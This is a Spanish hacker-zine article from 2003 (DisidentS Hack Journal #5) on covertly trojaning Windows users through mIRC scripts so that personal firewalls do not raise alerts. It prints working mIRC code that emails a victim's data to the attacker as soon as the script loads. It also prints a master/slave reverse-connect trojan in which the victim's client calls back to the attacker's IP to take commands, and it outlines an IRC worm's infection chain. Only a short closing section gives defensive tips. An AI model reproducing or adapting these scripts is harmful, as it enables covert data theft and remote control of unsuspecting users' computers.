[009]_Ocultismo_troyanizar_con_sigilo_(MIRC)_by_FREEBRAIN_-_Disidents_Journal_5

 
                     -+-| DisidentS Hack Journal #5 |-+-
 
 
 
 
 
 
 
 
 
   ______________________________________________________________________
  |                                                                      |
  | -+- Titulo_____: Ocultismo: troyanizar con sigilo (win32)            |
  | -+- Autor______: FREEBRAIN                                           |
  | -+- E-Mail_____: freebrain@unionnewbies.net                          |
  | -+- Team_______: DisidentS España - http://disidents-team.cjb.net    |
  |______________________________________________________________________|
 
 
 
 
 
"la potencia sin control..no sirve de nada"
>>------------------------------------------------------------------------<<
 
 
 
----------------------------------------------------------------------------
----------------------------------------------------------------------------
.==========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================
|=~ 1- Introduccion                                                        |
|=~ 2- Tenemos problemas                                                   |
|=~ 3- Asaltando...                                                        |
|=~ 4- Otras ideas malignas                                                |
|=~ 5- Troyaneo silencioso                                                 |
|=~ 6- Solucionando...                                                     |
|=~ 7- Despedida                                                           |
|=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=.
======================================================~ INDICE ~============
============================================================================


.==========================================================================.
|===========~ 1- Introduccion. ~|===========================================
|===========================================================================

En este articulo me he centrado (como ya te habras dando cuenta) en el 
troyaneo. Principalmente en cuanto a troyaneo "silencioso" (una tecnica
que explicare mas adelante) y a evitar firewalls.

Todos sabemos lo que es un firewall, uno de las herramientas mas "miticas" 
(por asi decirlo) de la seguridad informatica, y tambien por supuesto, uno 
de los temas mas escabrosos a la hora de llevar a cabo una intrusion en un 
host.

Los firewalls no son mas que sistemas de filtrado de paquetes, es decir, 
filtran los paquetes que vienen hacia nuestro ordenador desde una red, 
tecnicamente, si conseguimos eludir el firewall (usando debidamente un 
servicio no filtrado)deberiamos estar "en la maquina victima". Con este 
canal establecido, podriamos enviar y enviar datos desde nuestro
ordenador hasta la victima, pasandonos por las narices el firewall y por 
supuesto, recibir datos de la maquina mediante ese "canal" establecido. 
Habriamos conseguido "burlar" el firewall. Realmente, no hemos conseguido 
burlar nada, puesto que hemos utilizado un servicio no bloqueado (servidor) 
que mediante algun fallo, nos ha permitido acceder al host remoto, hasta 
aqui ningun problema.

Pero este es un caso demasiado concreto, es decir, ya contabamos previamente 
con un servicio "tocado" en la maquina victima, hay ocasiones en las que no 
es asi...

En el caso de que no hubiese algun fallo en el software de la victima, 
rapidamente se nos vendria a la cabeza troyanearla, pero claro, hay un 
problema ... el firewall!

 
-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 2- Tenemos problemas. ~|======================================
|===========================================================================

Imaginemos ahora que hemos conseguido depositar un troyano en el maquina 
victima gracias a ingenieria social, pero pensemos: si la victima ejecutase 
el troyano, rapidamente el firewall daria un aviso de que un programa 
(el troyano) está intentando acceder a la red como servidor, lo cual 
alertaria a la victima, que casi seguro, bloquearia el acceso de ese 
programa a la red, por consiguiente, nuestros esfuerzos habrian sido nulos.

Ahora pensar ... ¿como podria saltar un firewall localmente? es decir, ¿como 
hago que el firewall no se de cuenta de que se está ejecutando un archivo 
como servidor? bien ... muy sencillo, ¡aprovecharnos de los servicios que 
están corriendo en la maquina victima!

 
-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 3- Asaltando... ~|===========================================
|===========================================================================

¿Como? pues bien, uno de las principales alternativas seria troyanear el 
servicio (servidor) que convenga, de ese modo, si abrieramos un socket extra 
(el troyano) desde ese programa, el firewall no lo advertiria, puesto que ese 
servicio estaba previamente autorizado por el administrador, y tendria 
"permiso" para abrir todas las conexiones que quisiera a la red.

Bingo! pero troyanear un servicio no es tan facil, una de las maneras (la que 
voy explicar un poco aqui) para troyanear un servicio (eludiendo asi el 
firewall) seria con un script para la aplicación.

¿Que son los scripts de aplicaciones? pues son "pequeños programas" que van 
ligados a la aplicación "principal", la cual los ejecuta y los emplea para 
diversos fines, no se scriptea igual para todas las aplicaciones, y no todas 
las aplicaciones utilizan los script's del mismo modo.

Puesto que este texto está orientado principalmente a win32, veamos una de 
las aplicaciones mas comumente utilizadas (aplicaciones de red) y 
scripteables: el MIRC.

¿Que es el MIRC? MIRC es un cliente para redes IRC (Internet Relay Chat, un 
protocolo de chat) que corre bajo win32, y que permite la creación de script's 
para mejorar su funcionamiento. Pero, podemos usar los script's para fines 
"malignos" sin ningun tipo de problema. Los script's de MIRC suelen ser 
archivos.mrc, ficheros de texto donde reside un codigo escrito en el lenguaje 
de programación mIRC Scripting (documentacion sobre mIRC Scripting en 
www.sarrio.org). El mIRC Scripting trae una serie de funciones muy interesantes 
a la hora de "troyanear", como pueden ser:


- read : esta funcion es empleada para leer todo tipo de ficheros

- readini : para leer ficheros .ini 

- sockopen : con esta funcion podremos abrir un socket (conexión)

- sockread : gracias a esta funcion podremos emplear toda la informacion que 
             recibimos por un socket

- socklisten : esta funcion sirve para poner un puerto en escucha :-)

- sockwrite : con esto podremos enviar informacion por un socket 

- remove : con esta funcion podremos borrar ficheros del disco rigido

- write : esta funcion nos permite escribir archivos en el hd

- writeini : lo mismo que write pero con ficheros .ini :-P

- run : permite ejecutar archivos (.exe principalmente)

- load : permite cargar script's en el MIRC

- unload : sirve para descargar script's del MIRC


Estas solo son algunas funciones disponibles en mIRC Scripting, pero son una 
clara muestra de que podemos hacer bastante con un script.

Ahora vamos a preparar un pequeño script que segun sea ejecutado en la maquina 
victima, nos envie un e-mail donde nos revele cual es el directorio donde la 
victima tiene instalado el MIRC:

****

on 1:LOAD:{

.sockopen conexion-smtp <servidor-smtp> 25

}

on 1:sockopen:conexion-smtp:{

if ( $sockerr < 0 ) {  echo $null }

else { 

.sockwrite -nt conexion-smtp mail from: victima@incauta.net

.sockwrite -nt conexion-smtp rcpt to: nuestro@email.net

.sockwrite -nt conexion-smtp data

.sockwrite -nt conexion-smtp El directorio donde la victima instaló su MIRC es: $mircdir

.sockwrite -nt conexion-smtp .

.sockclose conexion-stmp

}
}

****

Ahora, analizemos ese pequeño código linea por linea :-)

on 1:LOAD:{ ... } --> Esto se llama "evento remoto", e indica que el codigo 
que va entre parentesis ha de ejecutarse cuando la victima cargue el script 
en su MIRC.

.sockopen conexion-smtp <servidor-smtp> 25 --> Esta orden indica que ha de 
abrirse un socket a un <servidor-smtp> (eso lo cambiariamos por el servidor 
SMTP que queramos) por el puerto 25.El nombre del socket seria "conexion-smtp", 
lo cual nos permite distinguirlo de otros posibles sockets :-)

on 1:sockopen:conexion-smtp:{ ... } --> Esto es otro evento remoto, e 
indica que el codigo entre llaves SOLO debe de ejecutarse cuando seintente 
abrir un socket llamado "conexion-smtp".

if ( $sockerr < 0 ) { echo $null } --> Esta linea indica que si la conexión 
NO ha podido establecerse, no se haga NADA (echo $null). La funcion "echo" 
es empleada para reflejar un texto en pantalla(algo asi como printf) pero 
tambien se le suele dar este uso :-) ($null == NADA).

.sockwrite -nt conexion-smtp ... --> Esto indica que se ha de enviar 
(sockwrite) los datos pertinentes (...) por el socket "conexion-smtp".
NOTA: -nt son "argumentos" u "opciones" de la funcion sockwrite. Ahi como 
vereis, usamos protocolo SMTP para enviarnos el mail :-) (si quereis saber 
más sobre SMTP, RFC o google.com)

$mircdir --> Esto es un identificador, y en este caso, contiene el 
directorio donde se halla el MIRC instalado (si quereis probarlo, escribid 
en vuestro MIRC: //echo $mircdir).

.sockclose conexion-smtp --> Por ultimo, cerramos nuestra conexión 
(conexion-smtp) al servidor SMTP.

NOTA: Para que esto funcione, o bien necesitamos un servidor smtp con 
relay abierto (que permita enviar correo a cualquier dirección) o bien 
utilizar el servidor SMTP de nuestro correo. ¿Y como se cual es el servidor 
SMTP de mi correo? Pues por ejemplo, si tienes una cuenta de correo llamada 
pepito@terra.es, tu servidor smtp será smtp.terra.es. Si tu cuenta es 
loleilo@eremas.com, tu servidor smtp será stmp.eresmas.com y así, fijandonos 
en el dominio (@loquesea.tld) de nuestro correo, asi, garantizado que 
siempre funciona :-)

Ahora pensareis: "este script es una GRAN CHORRADA". De acuerdo, lo es, pero 
nos ha permitido obtener datos de la victima sin alertar a su hipotetico 
firewall, puesto que el socket lo ha ejecutado el MIRC, y el MIRC estaba 
previamente autorizado para abrir conexiones a la red :-P
Incluso si la victima usa DCC con el MIRC, podriamos usar un script que 
pusiera un puerto en escucha a la victima, una especie de "troyano", y la 
victima seria sin darse cuenta, puesto que el MIRC estaria previamente 
autorizado para actuar como servidor, si no lo está, el firewall pedirá 
autorización, y a no ser que la victima sea avispada, casi seguro que 
autorizará al MIRC. Todo depende del nivel de conocimientos y de la 
ingenieria social que se emplee.

Hemos utilizado un programa CLIENTE para obtener datos de la victima, sin 
alertar al  firewall, la cosa se pone bonita, no? :-)

 
-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 4- Otras ideas malignas. ~|===================================
|===========================================================================

Pero hemos hablado de troyanos, también se podria emplear un virus/gusano, 
claro que si. Veremos como aprovechar esto con un virus ya existente, yo le 
llamo "server.ini", puesto que es el nombre del archivo que infecta al MIRC, 
aunque realmente, no conozco el verdadero nombre de tal virus.

Es posible que si frecuentais redes de IRC como Undernet o DALnet, muchas 
veces habreis entrado a un canal, y os habrá aparecido según entrasteis,
algun query de un usuario diciendoos que visiteis no se que pagina porno, 
pues bien, sabed que estais ante un usuario infectado :-)

Ahora vamos a ver un poco, que hace este virus y como lo hace...

ANALISIS:

Funcionamiento del server.ini:

Todo empieza, cuando salimos de un canal en una red de IRC, y algun usuario 
nos abre un query diciendo que visitemos una página porno, entonces nosotros 
visitamos la web y aqui es donde empieza todo el matute.

NOTA: El virus solo infecta a los mIRC.

1- En la página web que visitamos, la que nos infecta, reside un codigo 
   javascript/activeX que nos copia en nuestro disco duro un archivo llamado 
   rol.vbs (un visual basic script).

2- Ahora el javascript/activeX de la página, nos ejecuta el rol.vbs.

3- Inmediatamente, el rol.vbs crea un archivo llamado server.ini en todas las 
   carpetas en donde resida el archivo mirc.exe.

4- Ahora, para que el server.ini sea usado por el mIRC, y asi poder hacer spam, 
   el rol.vbs se toma la molestia (que considerado) de cambiar nuestros 
   mirc.ini, para que el server.ini figure como rfile (remote file).

5- Ahora con el virus cargado, ya estamos haciendo spam en las redes de IRC, 
   y en la mayoria de los casos, ganandonos un Kill/G-line.

NOTA: El nombre del archivo virus server.ini está creado intencionadamente 
      así, para que se confunda con el servers.ini que trae el mIRC por 
      defecto.

Como ya habras visto, este virus utiliza un script para infectar los mIRC
(entre otras cosas). Aunque tuviesemos un firewall, estariamos igualmente
infectados, puesto que el virus usa de apoyo el mIRC.

Otra posibilidad mas remota seria llegar a encontrar una vulnerabilidad en
el firewall de la "victima" y explotarla, pero esto ya seria otro tema :-P


-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 5- Troyaneo silencioso. ~|====================================
|===========================================================================

Cuando hablamos de un troyano, hablamos de un cliente y de un servidor. Por
lo normal, el servidor pone un puerto en escucha (el que nosotros hayamos
especificado, aunque todos los troyanos traen un puerto predeterminado, como
por ejemplo el Back Oriffice trae el 31337) al cual se conecta el cliente,
que pone un puerto abierto (no en escucha, si no en "open").

Estas dos partes del troyano (cliente y servidor) se relacionan con la 
victima y con el atacante. Se asocia atacante & cliente, victima & servidor.

¿Cuales son los principales problemas de que se ponga un puerto en escucha 
en la maquina victima? Pues uno de ellos es que si realizamos un escaneo
de puertos a la victima, vamos a saber que esta infectada, puesto que 
veremos un puerto "extraño" abierto. Otro problema es tambien el firewall,
puesto que un firewall pide confirmacion cuando un programa de red va a 
actuar como servidor (aunque ese programa estuviese autorizado para acceder
a la red) pide permiso al usuario/administrador de la maquina para que dicho
programa pueda acceder a la red como servidor, usease, para que pueda 
aceptar conexiones (en el caso de un troyaneo, para que pudiese aceptar 
conexiones de los clientes).

Pues bien, si un programa con un socket en estado "open" (abierto) puede 
recibir y enviar datos, por que no se podria hacer un troyano donde el
archivo que deberia ejecutar la victima pusiese un socket en "open" y no
en escucha, y el programa del atacante (el cual pondria un socket en escucha
al que conectaria el infectado). El funcionamiento a grandes rasgos, seria
el siguiente (al programa que ejecutaria la victima le llamare "slave"
y al programa que ejecuta el atacante le llamare "master"): 

NOTA: master = maestro, slave = esclavo

- Abrimos el master, que pone en escucha un puerto en nuestra maquina.

- La victima abre el slave, que abre un socket a nuestra maquina por el 
  puerto que el master puso en escucha. 
 
(Ahora, aunque escaneasemos la maquina de la victima, no veriamos ningun
puerto abierto extraño)

- Ya hay comunicacion entre atacante y victima, ahora desde el master 
  enviamos el comando que queramos que ejecute el slave que se encuentra
  conectado al master. El slave deberia de ejecutarlo normalmente. Tambien
  pasaria lo mismo si pidiesemos que nos enviase datos, puesto que al ser
  un socket en estado "open", puede enviar y recibir datos.

Todo esto tiene varias ventajas frente al troyano "tradicional" donde el
master en este caso tendria el socket en "open" y el slave el socket en
"listen":

1- No pueden saber si la victima esta troyaneada mediante un escaneo de
   puertos.

2- Es sabido que siempre "hace menos ruido" un programa cliente que un
   servidor, dandonos una serie de ventajas que variaran segun el caso
   especifico de troyaneo.

Esta tecnica de "troyaneo silencioso" puede combinarse con lo que comentaba
antes, troyanear mediante scripts de aplicacion. Con estas dos tecnicas 
combinadas podriamos troyanear CUALQUIER aplicacion (tanto cliente como
servidor) scripteable de red.

Voy a ejemplificarlo con un pequeño codigo en mIRC Scripting (tambien poco
ofensivo) siguiendo la linea del anterior codigo presentado (revelar el
directorio donde la victima tiene instalado el mIRC). Este seria el codigo
del "master":

****

on 1:LOAD:{

.socklisten master 888

}

on 1:socklisten:master:{

.sockaccept victima

.sockwrite -nt victima REVELA-DIRECTORIO-MIRC

}

on 1:sockread:victima:{

.sockread %datos

.muestra %datos

}

alias muestra {

.echo -s Debug_Troyano: %datos

}

****

Como el anterior codigo, esto se guarda en un fichero .mrc y se carga con
el comando /load -rs <ruta> (en el mIRC, por supuesto).

Este codigo (segun se carga) nos pone un puerto en escucha (el 888) al
cual debe conectarse el cliente. Una vez que el cliente se conecta, le
dice al cliente un comando (REVELA-DIRECTORIO-MIRC), que debe reconocer
el cliente, para que el cliente le diga el directorio donde esta 
instalado el mIRC (el mIRC infectado, claro). Una vez recibidos estos
datos, se muestra en la ventana de status en el siguiente formato:

Debug_Troyano: <directorio_donde_esta_instalado_el_mirc>

Bueno, pues ahora vamos a por el codigo del slave :-)

****

on 1:LOAD:{

.sockopen slave <nuestra_ip> 888

on 1:sockopen:slave:{

if ( $sockerr < 0 ) { echo $null }

else { echo $null }

}

on 1:sockread:slave:{

.sockread %data

.procesa %data

}

alias procesa {

if ( %data == REVELA-DIRECTORIO-MIRC ) {

.sockwrite -nt slave $mircdir

}
}

****

Bien, este seria el codigo del slave, que tambien seguiria el mismo formato
.mrc y se cargaria del mismo modo que el master.

Este codigo segun es cargado abre un socket a nuestra ip (tenemos que cambiar
"<nuestra_ip>" por nuestra ip verdadera) por el puerto 888 (puerto que hemos
abierto con el master). Una vez se conecta, se queda ahi a la espera de que
le lleguen datos desde el master. Si le llega el dato "REVELA-DIRECTORIO-MIRC"
desde el master, entonces el slave envia ese dato al master con el sockwrite
(recordemos que $mircdir es un identificador que contiene el directorio
donde se encuentra el mirc :-P).

Ahora, el master (que ya dijimos lo que hacia) es cuando volveria a entrar
en juego y mostraria el directorio en la pantalla del atacante (en la ventana
de status de su mIRC).

Ahora, solo seria trabajarse mas el codigo, añadir mas funciones, una 
interfaz para el master, etc etc, y lograriamos un troyano que en el caso
de que el mIRC de la victima estuviera autorizado por su firewall para
actuar como cliente, no se alertaria al firewall, puesto que el mIRC 
seguiria siendo un cliente (el slave actua como cliente ;-) y el troyano
seguiria siendo igual de funcional que un troyano "clasico". Asi, el 
firewall no pediria al usuario/admin que autorizase al mIRC como server,
y troyaneariamos de un modo sigiloso 100%.

Yo aqui he empleado esta tecnica de "troyaneo silencioso" con mIRC
Scripting, pero realmente se puede emplear con cualquier lenguaje de 
programacion que nos apetezca :-)


-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 6- Solucionando... ~|=========================================
|===========================================================================

Esto es algo de dificil solucion. Lo primero es recomendar el uso de 
aplicaciones no scripteables, y en el caso de que se usen, recordad, TENED
cuidado con lo script's.

Otra cosa que recomiendo a mayores seria el uso de sistemas de monitoreado
de red (como Ethereal por ejemplo) que nos permitan tener controladas
nuestras conexiones a la red en todo momento, asi en el caso de que nos
troyaneasen mediante "troyaneo silencioso" podriamos ver que una conexion
"extraña" se esta abriendo a una maquina remota, y desde ahi podriamos
poner los medios para bloquearla, etc etc.

Y bueno, eso es todo. Recordad tambien (sobre todo en el tema de los 
troyaneos) que un poco de paranoya nos previene de muchos males.

Bueno, pues con esto creo que no me queda mucho mas que decir :-)


-----------------------------------------------------------------------------
.==========================================================================.
|===========~ 7- Despedida. ~|==============================================
|===========================================================================

Y hemos llegado ya al final del articulo. En el titulo he puesto "(win32)"
puesto que todos estos "experimentos" los he realizado en un entorno Windows
con los firewalls Zone Alarm y Sygate. De todos modos, muchas de las cosas
aqui narradas supongo que podrian aplicarse a otros sistemas operativos como
por ejemplo Linux. Ya sabeis, si quereis salir de dudas y ampliar sobre el
tema ... a experimentar!

Como siempre, dar las gracias a:

#disidents, #hacker, #hackers @ irc-phoenix.org

#disidents, #sleepx, #ayuda_internet @ irc-hispano.org

Y tambien agradecer y dedicar mi trabajo a:

Nusky, w3ndig0, S-P-A-R-K, Tresde, RandomLoG, ipy, ^DeLtA^, ~j~, Lorddev, 
TcpstacK, uRz4, MaSTeRiX, |_Tr0mP4s, [[AKira]], PoLa_De_A, plAnadecU, 
{V|s|oN}, JeNdArK, a toda la gente de DisidentS y a los que me conoceis.

Gracias a ti tambien por haber invertido tu tiempo leyendo esto.

- E0f-

 
-----------------------------------------------------------------------------
                   DisidentS Hacker Team 2003 (c).
 
----------------------------------------------------------------------------
                 Mail del Team: disidents@yahoo.es
----------------------------------------------------------------------------
 
                               0
                             X0 0X
                               S
